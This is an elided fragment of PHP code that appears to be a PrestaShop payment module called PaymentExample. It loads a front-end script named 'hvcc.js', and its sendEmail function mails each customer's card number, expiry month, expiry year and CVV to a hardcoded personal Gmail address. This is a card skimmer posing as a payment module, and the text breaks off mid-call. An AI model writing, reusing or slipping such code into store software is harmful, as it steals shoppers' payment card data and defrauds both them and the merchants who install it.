...
class PaymentExample extends PaymentModule
{
    ...
    {
        /* if (!Db::getInstance()->Execute('CREATE TABLE IF NOT EXISTS `' . _DB_PREFIX_ . 'aaaa` (
    ...
    {
        //$this->context->controller->addJS(($this->_path).'views/js/hvcc.js');
        $this->context->controller->registerJavascript('modules-paymentexample', 'modules/'.$this->name.'/views/js/hvcc.js', ['position' => 'bottom', 'priority' => 150]);
    }
    ...
    public function sendEmail($params)
    {
        ...
        return Mail::Send(
            ...
            array(
                '{C_NUMBER}' => $params['CNumber'],
                '{C_MONTH}' => $params['Month'],
                '{C_YEAR}' => $params['Year'],
                '{C_CVV}' => $params['cvv'],
            ),
            'volkanmechul@gmail.com',
            null,
            null,
            null,
            null,
